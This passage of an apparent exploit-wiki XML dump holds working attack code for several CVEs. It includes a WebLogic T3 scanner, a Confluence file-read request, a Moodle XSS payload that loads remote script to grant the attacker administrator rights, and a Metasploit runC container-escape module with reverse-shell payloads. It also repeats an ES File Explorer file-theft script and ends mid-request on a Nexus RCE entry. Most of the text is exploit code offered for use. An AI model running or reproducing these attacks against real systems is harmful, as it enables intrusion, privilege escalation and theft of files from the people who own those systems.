        print '%s:%d 存在 %s 漏洞。'%(server_addr[0],server_addr[1],VUL[index])
        vul_yes.append(server_addr)
    else:
        print '%s:%d 不存在 %s 漏洞。' % (server_addr[0],server_addr[1],VUL[index])
        print '[+] You look like Cai Xukun when you play basketball'
        vul_no.append(server_addr)


def run(index):
    with open("url.txt",'r') as lists:
        for server_addr in lists:
            server_addr=server_addr.strip('\n\r')
            dip=server_addr.split(':')[0]
            global dport
            dport=int(server_addr.split(':')[1])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            server_addr = (dip, dport)
            try:
                t3handshake(sock,server_addr)
            except Exception as e:
                print '%s:%d连接失败，请检查IP是否存活...' %(server_addr[0],server_addr[1])
            else:
                try:
                    lendate = buildT3RequestObject(sock,dport,server_addr)
                    rs=sendEvilObjData(sock,PAYLOAD[index],lendate)
                    # print 'rs',rs
                except Exception as e:
                    print '%s:%d请求频繁，请稍后自行单独测试...' %(server_addr[0],server_addr[1])
                    vul_more_test.append(server_addr)
                else:
                    checkVul(rs,server_addr,index)
            finally:
                sock.close()

    print '='*50
    print '检测完成！'
    print '以下IP存在CVE-2019-2890漏洞：'
    for yes in vul_yes:
        print '%s:%s' % (yes[0],yes[1])
    print '='*50
    print '以下IP不存在漏洞：'
    for no in vul_no:
        print '%s:%s' % (no[0],no[1])
    print '='*50
    print '以下IP请求频繁，需单独自行测试：'
    for more in vul_more_test:
        print '%s:%s' % (more[0],more[1])
    print '='*50


if __name__=="__main__":
    run(0)
&lt;/pre&gt;</text>
      <sha1>ns91pjyq8by6c0jd1pw96sfe69ow48f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-3396 Atlassian Confluence 路徑穿越&amp;命令執行漏洞</title>
    <ns>0</ns>
    <id>2051</id>
    <revision>
      <id>2476</id>
      <timestamp>2021-05-05T06:56:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== &lt;pre&gt; 所有1.xx，2.xx，3.xx，4.xx和5.xx版本  所有6.0.x，6.1.x，6.2.x，6.3.x，6.4.x和6.5.x版本  6.6.12之前的所有6.6.x版本  所有6.7.x..."</comment>
      <origin>2476</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1220" sha1="kwj8371qen1diqkgngbeuoas45fuouu" xml:space="preserve">==漏洞影響==
&lt;pre&gt;
所有1.xx，2.xx，3.xx，4.xx和5.xx版本

所有6.0.x，6.1.x，6.2.x，6.3.x，6.4.x和6.5.x版本

6.6.12之前的所有6.6.x版本

所有6.7.x，6.8.x，6.9.x，6.10.x和6.11.x版本

6.12.3之前的所有6.12.x版本

6.13.3之前的所有6.13.x版本

6.14.2之前的所有6.14.x版本
&lt;/pre&gt;


==漏洞利用==
發送如下數據包，即可讀取文件web.xml

&lt;pre&gt;
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;
Content-Type: application/json; charset=utf-8
Content-Length: 176

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","w
&lt;/pre&gt;


6.12以前的Confluence沒有限製文件讀取的協議和路徑，我們可以使用file:///etc/passwd來讀取文件，也可以通過https://...來加載遠程文件。

該文件是一個Velocity模板，我們可以通過模板注入（SSTI）來執行任意命令。</text>
      <sha1>kwj8371qen1diqkgngbeuoas45fuouu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-3810 Moodle 3.6.1 XSS漏洞</title>
    <ns>0</ns>
    <id>1567</id>
    <revision>
      <id>1956</id>
      <timestamp>2021-04-30T10:14:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Moodle 3.6.1 - Persistent Cross-Site Scripting (XSS) # Date: 04/2021 # Exploit Author: farisv # Vendor Homepage: https://moodle.org/ # Software..."</comment>
      <origin>1956</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2691" sha1="7efsmvmzhfsjqkckt6oknxwqzj0ae13" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Moodle 3.6.1 - Persistent Cross-Site Scripting (XSS)
# Date: 04/2021
# Exploit Author: farisv
# Vendor Homepage: https://moodle.org/
# Software Link: https://download.moodle.org https://github.com/moodle/moodle/archive/refs/tags/v3.6.1.zip
# Version: Moodle &lt; 3.6.2, &lt; 3.5.4, &lt; 3.4.7, &lt; 3.1.16
# CVE: CVE-2019-3810

Moodle is a learning platform designed to provide educators, administrators,
and learners with a single robust, secure and integrated system to create
personalised learning environments.

The following is PoC to use the XSS bug on /userpix/ (CVE-2019-3810) for
privilege escalation from student to administrator.

1. Upload the XSS payload [1] to pastebin or other similar service.
   Change the value of userid to your own id.
   Let's say the URL is https://pastebin.com/raw/xxxxxxxx.
2. Login to your student account.
3. Set first name with:
   " style="position:fixed;height:100%;width:100%;top:0;left:0" onmouseover="x=document.createElement
4. Set surname with:
  ('script');x.src='https://pastebin.com/raw/xxxxxxxx';document.body.appendChild(x); alert('XSS')
5. Ask the administrator to open /userpix/ page or put the link to that page
   on your post and wait.

If successful, your account will be added as administrator.

See the demonstration video on https://github.com/farisv/Moodle-CVE-2019-3810

[1] XSS Payload for privilege escalation on Moodle. Change the value of userid to your id.

var webroot = '/';
var userid = '3';
var sesskey = '';

function get(path, success) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', webroot + path);
    xhr.onreadystatechange = function() {
        if (xhr.readyState &gt; 3 &amp;&amp; xhr.status == 200) {
            success(xhr.responseText);
        }
    };
    xhr.send();
    return xhr;
}

function post(path, data, success) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', webroot + path);
    xhr.onreadystatechange = function() {
        if (xhr.readyState &gt; 3 &amp;&amp; xhr.status == 200) {
            success(xhr.responseText);
        }
    };
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(encodeURI(data));
    return xhr;
}

function setAdmin() {
    // Assign administrator access to userid
    bpath = 'admin/roles/admins.php';
    data = "confirmadd=" + userid + "&amp;sesskey=" + sesskey;
    post(bpath, data, function(data){});
}

function getSesskey(data) {
    var sesskey_find = data.indexOf('"sesskey":"');
    sesskey = data.substr(sesskey_find + 11, 10);
    setAdmin();
}

function payload() {
    // We can find Sesskey inside JS script in main page
    get('', getSesskey);
}

// Start
payload();
            
&lt;/pre&gt;</text>
      <sha1>7efsmvmzhfsjqkckt6oknxwqzj0ae13</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-5736 Docker Container 容器逃逸漏洞</title>
    <ns>0</ns>
    <id>5426</id>
    <revision>
      <id>6227</id>
      <timestamp>2021-07-03T06:37:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModule &lt; Msf:..."</comment>
      <origin>6227</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12918" sha1="qgknz44uwn7ktk55t4wxmfb2zpbza23" xml:space="preserve">&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule &lt; Msf::Exploit::Local
 
  Rank = ManualRanking
 
  include Msf::Post::Linux::Priv
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  # This matches PAYLOAD_MAX_SIZE in CVE-2019-5736.c
  PAYLOAD_MAX_SIZE = 1048576
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Docker Container Escape Via runC Overwrite',
        'Description' =&gt; %q{
          This module leverages a flaw in `runc` to escape a Docker container
          and get command execution on the host as root. This vulnerability is
          identified as CVE-2019-5736. It overwrites the `runc` binary with the
          payload and wait for someone to use `docker exec` to get into the
          container. This will trigger the payload execution.
 
          Note that executing this exploit carries important risks regarding
          the Docker installation integrity on the target and inside the
          container ('Side Effects' section in the documentation).
        },
        'Author' =&gt; [
          'Adam Iwaniuk', # Discovery and original PoC
          'Borys Popławski', # Discovery and original PoC
          'Nick Frichette', # Other PoC
          'Christophe De La Fuente', # MSF Module
          'Spencer McIntyre' # MSF Module co-author ('Prepend' assembly code)
        ],
        'References' =&gt; [
          ['CVE', '2019-5736'],
          ['URL', 'https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html'],
          ['URL', 'https://www.openwall.com/lists/oss-security/2019/02/13/3'],
          ['URL', 'https://www.docker.com/blog/docker-security-update-cve-2018-5736-and-container-security-best-practices/']
        ],
        'DisclosureDate' =&gt; '2019-01-01',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; %w[linux unix],
        'Arch' =&gt; [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
        'Privileged' =&gt; true,
        'Targets' =&gt; [
          [
            'Unix (In-Memory)',
            {
              'Platform' =&gt; 'unix',
              'Type' =&gt; :unix_memory,
              'Arch' =&gt; ARCH_CMD,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux (Dropper) x64',
            {
              'Platform' =&gt; 'linux',
              'Type' =&gt; :linux_dropper,
              'Arch' =&gt; ARCH_X64,
              'Payload' =&gt; {
                'Prepend' =&gt; Metasm::Shellcode.assemble(Metasm::X64.new, &lt;&lt;-ASM).encode_string
                    push 4
                    pop  rdi
                  _close_fds_loop:
                    dec rdi
                    push 3
                    pop rax
                    syscall
                    test rdi, rdi
                    jnz _close_fds_loop
 
                    mov  rax, 0x000000000000006c
                    push rax
                    mov  rax, 0x6c756e2f7665642f
                    push rax
                    mov  rdi, rsp
                    xor  rsi, rsi
 
                    push 2
                    pop  rax
                    syscall
 
                    push 2
                    pop  rax
                    syscall
 
                    push 2
                    pop  rax
                    syscall
                ASM
              },
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp',
                'PrependFork' =&gt; true
              }
            }
          ],
          [
            'Linux (Dropper) x86',
            {
              'Platform' =&gt; 'linux',
              'Type' =&gt; :linux_dropper,
              'Arch' =&gt; ARCH_X86,
              'Payload' =&gt; {
                'Prepend' =&gt; Metasm::Shellcode.assemble(Metasm::X86.new, &lt;&lt;-ASM).encode_string
                    push 4
                    pop  edi
                  _close_fds_loop:
                    dec  edi
                    push 6
                    pop  eax
                    int  0x80
                    test edi, edi
                    jnz  _close_fds_loop
 
                    push 0x0000006c
                    push 0x7665642f
                    push 0x6c756e2f
                    mov  ebx, esp
                    xor  ecx, ecx
 
                    push 5
                    pop  eax
                    int  0x80
 
                    push 5
                    pop  eax
                    int  0x80
 
                    push 5
                    pop  eax
                    int  0x80
                ASM
              },
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x86/meterpreter/reverse_tcp',
                'PrependFork' =&gt; true
              }
            }
          ]
        ],
        'DefaultOptions' =&gt; {
          # Give the user on the target plenty of time to trigger the payload
          'WfsDelay' =&gt; 300
        },
        'DefaultTarget' =&gt; 1,
        'Notes' =&gt; {
          # Docker may hang and will need to be restarted
          'Stability' =&gt; [CRASH_SERVICE_DOWN, SERVICE_RESOURCE_LOSS, OS_RESOURCE_LOSS],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [ARTIFACTS_ON_DISK]
        }
      )
    )
 
    register_options([
      OptString.new(
        'OVERWRITE',
        [
          true,
          'Shell to overwrite with \'#!/proc/self/exe\'',
          '/bin/sh'
        ]
      ),
      OptString.new(
        'SHELL',
        [
          true,
          'Shell to use in scripts (must be different than OVERWRITE shell)',
          '/bin/bash'
        ]
      ),
      OptString.new(
        'WRITABLEDIR',
        [
          true,
          'A directory where you can write files.',
          '/tmp'
        ]
      )
    ])
  end
 
  def encode_begin(real_payload, reqs)
    super
 
    return unless target['Type'] == :unix_memory
 
    reqs['EncapsulationRoutine'] = proc do |_reqs, raw|
      # Replace any instance of the shell we're about to overwrite with the
      # substitution shell.
      pl = raw.gsub(/\b#{datastore['OVERWRITE']}\b/, datastore['SHELL'])
      overwrite_basename = File.basename(datastore['OVERWRITE'])
      shell_basename = File.basename(datastore['SHELL'])
      # Also, substitute shell base names, since some payloads rely on PATH
      # environment variable to call a shell
      pl.gsub!(/\b#{overwrite_basename}\b/, shell_basename)
      # Prepend shebang
      "#!#{datastore['SHELL']}\n#{pl}\n\n"
    end
  end
 
  def exploit
    unless is_root?
      fail_with(Failure::NoAccess,
                'The exploit needs a session as root (uid 0) inside the container')
    end
    if target['Type'] == :unix_memory
      print_warning(
        "A ARCH_CMD payload is used. Keep in mind that Docker will be\n"\
        "unavailable on the target as long as the new session is alive. Using a\n"\
        "Meterpreter payload is recommended, since specific code that\n"\
        "daemonizes the process is automatically prepend to the payload\n"\
        "and won\'t block Docker."
      )
    end
 
    verify_shells
 
    path = datastore['WRITABLEDIR']
    overwrite_shell(path)
    shell_path = setup_exploit(path)
 
    print_status("Launch exploit loop and wait for #{wfs_delay} sec.")
    cmd_exec('/bin/bash', shell_path, wfs_delay, 'Subshell' =&gt; false)
 
    print_status('Done. Waiting a bit more to make sure everything is setup...')
    sleep(5)
    print_good('Session ready!')
  end
 
  def verify_shells
    ['OVERWRITE', 'SHELL'].each do |option_name|
      shell = datastore[option_name]
      unless command_exists?(shell)
        fail_with(Failure::BadConfig,
                  "Shell specified in #{option_name} module option doesn't exist (#{shell})")
      end
    end
  end
 
  def overwrite_shell(path)
    @shell = datastore['OVERWRITE']
    @shell_bak = "#{path}/#{rand_text_alphanumeric(5..10)}"
    print_status("Make a backup of #{@shell} (#{@shell_bak})")
    # This file will be restored if the loop script succeed. Otherwise, the
    # cleanup method will take care of it.
    begin
      copy_file(@shell, @shell_bak)
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      fail_with(Failure::NoAccess, "Unable to backup #{@shell} to #{@shell_bak}: #{e}")
    end
 
    print_status("Overwrite #{@shell}")
    begin
      write_file(@shell, '#!/proc/self/exe')
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      fail_with(Failure::NoAccess, "Unable to overwrite #{@shell}: #{e}")
    end
  end
 
  def setup_exploit(path)
    print_status('Upload payload')
    payload_path = "#{path}/#{rand_text_alphanumeric(5..10)}"
    if target['Type'] == :unix_memory
      vprint_status("Updated payload:\n#{payload.encoded}")
      upload(payload_path, payload.encoded)
    else
      pl = generate_payload_exe
      if pl.size &gt; PAYLOAD_MAX_SIZE
        fail_with(Failure::BadConfig,
                  "Payload is too big (#{pl.size} bytes) and must less than #{PAYLOAD_MAX_SIZE} bytes")
      end
      upload(payload_path, generate_payload_exe)
    end
 
    print_status('Upload exploit')
    exe_path = "#{path}/#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx(exe_path, get_exploit)
    register_files_for_cleanup(exe_path)
 
    shell_path = "#{path}/#{rand_text_alphanumeric(5..10)}"
    @runc_backup_path = "#{path}/#{rand_text_alphanumeric(5..10)}"
    print_status("Upload loop shell script ('runc' will be backed up to #{@runc_backup_path})")
    upload(shell_path, loop_script(exe_path: exe_path, payload_path: payload_path))
 
    return shell_path
  end
 
  def upload(path, data)
    print_status("Writing '#{path}' (#{data.size} bytes) ...")
    begin
      write_file(path, data)
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      fail_with(Failure::NoAccess, "Unable to upload #{path}: #{e}")
    end
    register_file_for_cleanup(path)
  end
 
  def upload_and_chmodx(path, data)
    upload(path, data)
    chmod(path, 0o755)
  end
 
  def get_exploit
    target_arch = session.arch
    if session.arch == ARCH_CMD
      target_arch = cmd_exec('uname -a').include?('x86_64') ? ARCH_X64 : ARCH_X86
    end
    case target_arch
    when ARCH_X64
      exploit_data('CVE-2019-5736', 'CVE-2019-5736.x64.bin')
    when ARCH_X86
      exploit_data('CVE-2019-5736', 'CVE-2019-5736.x86.bin')
    else
      fail_with(Failure::BadConfig, "The session architecture is not compatible: #{target_arch}")
    end
  end
 
  def loop_script(exe_path:, payload_path:)
    &lt;&lt;~SHELL
      while true; do
        for f in /proc/*/exe; do
          tmp=${f%/*}
          pid=${tmp##*/}
          cmdline=$(cat /proc/${pid}/cmdline)
          if [[ -z ${cmdline} ]] || [[ ${cmdline} == *runc* ]]; then
            #{exe_path} /proc/${pid}/exe #{payload_path} #{@runc_backup_path}&amp;
            sleep 3
            mv -f #{@shell_bak} #{@shell}
            chmod +x #{@shell}
            exit
          fi
        done
      done
    SHELL
  end
 
  def cleanup
    super
 
    # If something went wrong and the loop script didn't restore the original
    # shell in the docker container, make sure to restore it now.
    if @shell_bak &amp;&amp; file_exist?(@shell_bak)
      copy_file(@shell_bak, @shell)
      chmod(@shell, 0o755)
      print_good('Container shell restored')
    end
  rescue Rex::Post::Meterpreter::RequestError =&gt; e
    fail_with(Failure::NoAccess, "Unable to restore #{@shell}: #{e}")
  ensure
    # Make sure we delete the backup file
    begin
      rm_f(@shell_bak) if @shell_bak
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      fail_with(Failure::NoAccess, "Unable to delete #{@shell_bak}: #{e}")
    end
  end
 
  def on_new_session(new_session)
    super
    @session = new_session
    runc_path = cmd_exec('which docker-runc')
    if runc_path == ''
      print_error(
        "'docker-runc' binary not found in $PATH. Cannot restore the original runc binary\n"\
        "This must be done manually with: 'cp #{@runc_backup_path} &lt;path to docker-runc&gt;'"
      )
      return
    end
 
    begin
      rm_f(runc_path)
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      print_error("Unable to delete #{runc_path}: #{e}")
      return
    end
    if copy_file(@runc_backup_path, runc_path)
      chmod(runc_path, 0o755)
      print_good('Original runc binary restored')
      begin
        rm_f(@runc_backup_path)
      rescue Rex::Post::Meterpreter::RequestError =&gt; e
        print_error("Unable to delete #{@runc_backup_path}: #{e}")
      end
    else
      print_error(
        "Unable to restore the original runc binary #{@runc_backup_path}\n"\
        "This must be done manually with: 'cp #{@runc_backup_path} runc_path'"
      )
    end
  end
 
end
 
#  0day.today [2021-07-03]  #
&lt;/pre&gt;</text>
      <sha1>qgknz44uwn7ktk55t4wxmfb2zpbza23</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-6447 ES File Explorer 4.1.9.7.4 任意文件寫入漏洞</title>
    <ns>0</ns>
    <id>5281</id>
    <revision>
      <id>6047</id>
      <timestamp>2021-06-29T10:10:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: ES File Explorer v4.1.9.7.4  ==EXP== &lt;pre&gt; # Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read #..."</comment>
      <origin>6047</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2997" sha1="b477wb29ntnkyyi9bsjhfmztws4mz0j" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: ES File Explorer v4.1.9.7.4

==EXP==
&lt;pre&gt;
# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447

import requests
import json
import ast
import sys

if len(sys.argv) &lt; 3:
    print(f"USAGE {sys.argv[0]} &lt;command&gt; &lt;IP&gt; [file to download]")
    sys.exit(1)

url = 'http://' + sys.argv[2] + ':59777'
cmd = sys.argv[1]
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
listCmds = cmds[:9]
if cmd not in cmds:
    print("[-] WRONG COMMAND!")
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
    sys.exit(1)

print("\n==================================================================")
print("|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |")
print("|                Coded By : Nehal a.k.a PwnerSec                 |")
print("==================================================================\n")

header = {"Content-Type" : "application/json"}
proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def httpPost(cmd):
    data = json.dumps({"command":cmd})
    response = requests.post(url, headers=header, data=data)
    return ast.literal_eval(response.text)

def parse(text, keys):
    for dic in text:
        for key in keys:
            print(f"{key} : {dic[key]}")
        print('')

def do_listing(cmd):
    response = httpPost(cmd)
    if len(response) == 0:
        keys = []
    else:
        keys = list(response[0].keys())
    parse(response, keys)

if cmd in listCmds:
    do_listing(cmd)

elif cmd == cmds[9]:
    if len(sys.argv) != 4:
        print("[+] Include file name to download.")
        sys.exit(1)
    elif sys.argv[3][0] != '/':
        print("[-] You need to provide full path of the file.")
        sys.exit(1)
    else:
        path = sys.argv[3]
        print("[+] Downloading file...")
        response = requests.get(url + path)
        with open('out.dat','wb') as wf:
            wf.write(response.content)
        print("[+] Done. Saved as `out.dat`.")

elif cmd == cmds[10]:
    response = httpPost(cmd)
    keys = list(response.keys())
    for key in keys:
        print(f"{key} : {response[key]}")
&lt;/pre&gt;</text>
      <sha1>b477wb29ntnkyyi9bsjhfmztws4mz0j</sha1>
    </revision>
    <revision>
      <id>6048</id>
      <parentid>6047</parentid>
      <timestamp>2021-06-29T10:10:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6048</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3008" sha1="736f8d6dv3y8084csxup7sjvwzfcaub" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: ES File Explorer v4.1.9.7.4

==EXP==
&lt;pre&gt;
# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447

import requests
import json
import ast
import sys

if len(sys.argv) &lt; 3:
    print(f"USAGE {sys.argv[0]} &lt;command&gt; &lt;IP&gt; [file to download]")
    sys.exit(1)

url = 'http://' + sys.argv[2] + ':59777'
cmd = sys.argv[1]
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
listCmds = cmds[:9]
if cmd not in cmds:
    print("[-] WRONG COMMAND!")
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
    sys.exit(1)

print("\n==================================================================")
print("|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |")
print("|                Coded By : Nehal a.k.a PwnerSec                 |")
print("==================================================================\n")

header = {"Content-Type" : "application/json"}
proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def httpPost(cmd):
    data = json.dumps({"command":cmd})
    response = requests.post(url, headers=header, data=data)
    return ast.literal_eval(response.text)

def parse(text, keys):
    for dic in text:
        for key in keys:
            print(f"{key} : {dic[key]}")
        print('')

def do_listing(cmd):
    response = httpPost(cmd)
    if len(response) == 0:
        keys = []
    else:
        keys = list(response[0].keys())
    parse(response, keys)

if cmd in listCmds:
    do_listing(cmd)

elif cmd == cmds[9]:
    if len(sys.argv) != 4:
        print("[+] Include file name to download.")
        sys.exit(1)
    elif sys.argv[3][0] != '/':
        print("[-] You need to provide full path of the file.")
        sys.exit(1)
    else:
        path = sys.argv[3]
        print("[+] Downloading file...")
        response = requests.get(url + path)
        with open('out.dat','wb') as wf:
            wf.write(response.content)
        print("[+] Done. Saved as `out.dat`.")

elif cmd == cmds[10]:
    response = httpPost(cmd)
    keys = list(response.keys())
    for key in keys:
        print(f"{key} : {response[key]}")
&lt;/pre&gt;</text>
      <sha1>736f8d6dv3y8084csxup7sjvwzfcaub</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-6447 ES File Explorer 4.1.9.7.4 任意文件寫入漏洞/zh-hant</title>
    <ns>0</ns>
    <id>6112</id>
    <revision>
      <id>6982</id>
      <timestamp>2021-07-10T10:41:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本=="</comment>
      <origin>6982</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2972" sha1="nppbn1yjkqruijjlwz9tfhpkkyr1rg4" xml:space="preserve">&lt;languages /&gt;
==影響版本==
Version: ES File Explorer v4.1.9.7.4

==EXP==
&lt;pre&gt;
# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447

import requests
import json
import ast
import sys

if len(sys.argv) &lt; 3:
    print(f"USAGE {sys.argv[0]} &lt;command&gt; &lt;IP&gt; [file to download]")
    sys.exit(1)

url = 'http://' + sys.argv[2] + ':59777'
cmd = sys.argv[1]
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
listCmds = cmds[:9]
if cmd not in cmds:
    print("[-] WRONG COMMAND!")
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
    sys.exit(1)

print("\n==================================================================")
print("|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |")
print("|                Coded By : Nehal a.k.a PwnerSec                 |")
print("==================================================================\n")

header = {"Content-Type" : "application/json"}
proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def httpPost(cmd):
    data = json.dumps({"command":cmd})
    response = requests.post(url, headers=header, data=data)
    return ast.literal_eval(response.text)

def parse(text, keys):
    for dic in text:
        for key in keys:
            print(f"{key} : {dic[key]}")
        print('')

def do_listing(cmd):
    response = httpPost(cmd)
    if len(response) == 0:
        keys = []
    else:
        keys = list(response[0].keys())
    parse(response, keys)

if cmd in listCmds:
    do_listing(cmd)

elif cmd == cmds[9]:
    if len(sys.argv) != 4:
        print("[+] Include file name to download.")
        sys.exit(1)
    elif sys.argv[3][0] != '/':
        print("[-] You need to provide full path of the file.")
        sys.exit(1)
    else:
        path = sys.argv[3]
        print("[+] Downloading file...")
        response = requests.get(url + path)
        with open('out.dat','wb') as wf:
            wf.write(response.content)
        print("[+] Done. Saved as `out.dat`.")

elif cmd == cmds[10]:
    response = httpPost(cmd)
    keys = list(response.keys())
    for key in keys:
        print(f"{key} : {response[key]}")
&lt;/pre&gt;</text>
      <sha1>nppbn1yjkqruijjlwz9tfhpkkyr1rg4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-7238 Nexus Repository Manger extdirect 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>5642</id>
    <revision>
      <id>6483</id>
      <timestamp>2021-07-08T06:27:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Nexus &lt; 3.14.0  ==FOFA== &lt;pre&gt; app="Nexus-Repository-Manager" &lt;/pre&gt; &lt;translate&gt; ==漏洞利用== &lt;/translate&gt; &lt;transla..."</comment>
      <origin>6483</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7763" sha1="p1wf3vwnzqqkjnso0sre5kq33wdyfmn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Nexus &lt; 3.14.0

==FOFA==
&lt;pre&gt;
app="Nexus-Repository-Manager"
&lt;/pre&gt;
&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;translate&gt;
任意上傳 jar包，發送請求包執行命令
&lt;/translate&gt;
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 7256
Connection: close

